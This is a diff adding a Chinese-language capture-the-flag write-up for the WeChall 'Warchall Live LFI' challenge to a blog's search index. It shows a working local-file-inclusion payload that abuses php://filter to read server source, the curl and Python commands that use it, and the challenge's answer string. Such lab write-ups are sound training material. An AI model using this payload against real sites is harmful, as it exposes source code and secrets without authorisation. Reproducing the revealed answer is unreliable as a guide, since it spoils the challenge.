@@ -20016,4 +20016,57 @@ username：它必须通过正则检查，但长度又要超过正则允许的范
         <tag>regex</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Warchall - Live LFI</title>
+    <url>/wp/WeChall/wechall-warchall-live-lfi/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>One reason why I wanted the warchall box is to offer more realistic
+webhacking challenges. You may now try the Live LFI challenge that is
+hosted on it. Good Luck! Warchall 服务器上托管了更接近真实环境的 Web
+hacking 题目。这个挑战是 Live LFI。</p>
+</blockquote>
+<p>WeChall 页面本身只给出入口和提交框，真正的目标站点是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://lfi.warchall.net/index.php</span><br></pre></td></tr></table></figure>
+<p>打开页面后可以看到语言切换链接：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php?lang=en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;english.png&quot;</span> <span class="attr">title</span>=<span class="string">&quot;English&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;EN&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php?lang=de&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;german.png&quot;</span> <span class="attr">title</span>=<span class="string">&quot;German&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;DE&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键点是 <code>lang</code>
+参数。正常情况下它用于选择语言文件，但如果后端直接把它拼进
+<code>include</code>，就可能变成 Local File Inclusion。</p>
+<h3 id="solution">Solution</h3>
+<p>先做 baseline：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=en&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>页面正常返回英文内容。然后测试 <code>lang</code> 是否能影响 include
+目标。这里不需要 SSH，也不需要在服务器上找文件；直接利用 PHP stream
+wrapper 读取当前目录下的 <code>solution.php</code> 源码即可。</p>
+<p>payload：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</span><br></pre></td></tr></table></figure>
+<p>为什么用 <code>php://filter</code>：</p>
+<ul>
+<li>直接访问 <code>solution.php</code> 只能看到它输出的 HTML，PHP
+代码会被服务器执行，不会显示源码。</li>
+<li>LFI 触发的是后端 <code>include</code>，如果包含
+<code>solution.php</code>，里面的 PHP 仍然会执行，源码同样不可见。</li>
+<li><code>php://filter/convert.base64-encode/resource=solution.php</code>
+会让 PHP 在读取文件时先把文件内容 base64 编码。这样 include
+得到的是纯文本 base64，不会被当作 PHP 代码执行。</li>
+</ul>
+<p>实际请求：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php&#x27;</span></span><br><span class="line">PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4K...</span><br></pre></td></tr></table></figure>
+<p>把开头连续的 base64 部分解码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 - &lt;&lt;<span class="string">&#x27;PY&#x27;</span></span><br><span class="line">import <span class="built_in">base64</span>, re, urllib.request</span><br><span class="line">url = <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php&#x27;</span></span><br><span class="line">data = urllib.request.urlopen(url, <span class="built_in">timeout</span>=10).<span class="built_in">read</span>()</span><br><span class="line">b64 = re.match(rb<span class="string">&#x27;[A-Za-z0-9+/=\r\n]+&#x27;</span>, data).group(0)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(b64).decode())</span><br><span class="line">PY</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre style=<span class="string">&quot;color:#000;&quot;</span>&gt;teh falg si naer!&lt;/pre&gt;</span><br><span class="line">&lt;pre style=<span class="string">&quot;color:#fff;&quot;</span>&gt;the flag is near!&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php                  <span class="comment">#   YOUR_TROPHY</span></span><br><span class="line"><span class="built_in">return</span> <span class="string">&#x27;******************&#x27;</span>; <span class="comment"># &lt;-´ ?&gt;</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">SteppinStones42Pie</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>warchall</tag>
+      </tags>
+  </entry>
 </search>
